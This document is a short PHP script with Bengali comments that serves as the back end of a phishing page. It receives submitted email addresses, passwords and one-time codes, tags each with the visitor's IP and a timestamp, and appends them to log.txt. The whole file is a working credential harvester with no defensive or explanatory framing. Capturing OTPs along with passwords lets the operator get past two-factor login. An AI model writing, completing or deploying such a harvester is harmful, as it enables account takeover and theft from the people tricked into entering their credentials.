<?php
// Error reporting চালু করা যাতে কোনো সমস্যা থাকলে দেখা যায়
error_reporting(E_ALL);
ini_set('display_errors', 1);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // ফর্ম থেকে ডেটা সংগ্রহ
    $email = $_POST['email'] ?? 'N/A';
    $password = $_POST['password'] ?? 'N/A';
    $otp = $_POST['otp'] ?? 'N/A';
    
    // ইউজারের আইপি এবং সময় সংগ্রহ
    $ip = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d H:i:s");

    // ফাইলে সেভ করার ফরম্যাট
    $data = "------------------------------------------\n";
    $data .= "Time: $time | IP: $ip\n";
    $data .= "User: $email | Pass: $password | OTP: $otp\n";
    $data .= "------------------------------------------\n\n";

    // log.txt ফাইলে ডেটা অ্যাপেন্ড (Append) করা
    // LOCK_EX ব্যবহার করা হয়েছে যাতে একসাথে একাধিক ডেটা আসলে সমস্যা না হয়
    if (file_put_contents("log.txt", $data, FILE_APPEND | LOCK_EX)) {
        echo "Success";
    } else {
        echo "Error: Cannot write to log.txt. Check permissions.";
    }
} else {
    echo "Invalid Request Method.";
}
?>
